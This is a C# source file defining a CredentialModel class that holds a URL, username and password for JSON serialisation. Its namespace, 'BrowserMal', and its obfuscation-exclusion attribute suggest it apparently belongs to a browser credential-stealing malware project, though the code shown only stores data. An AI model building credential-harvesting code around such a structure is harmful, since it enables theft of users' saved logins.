using Newtonsoft.Json;
using System.Reflection;

namespace BrowserMal.Model
{
    [ObfuscationAttribute(Exclude = true, ApplyToMembers = true)]
    public class CredentialModel
    {
        [JsonProperty("url")]
        public string Url { get; set; }

        [JsonProperty("username")]
        public string Username { get; set; }

        [JsonProperty("password")]
        public string Password { get; set; }

        public CredentialModel(string url = "", string username = "", string password = "")
        {
            Url = url;
            Username = username;
            Password = password;
        }
    }
}
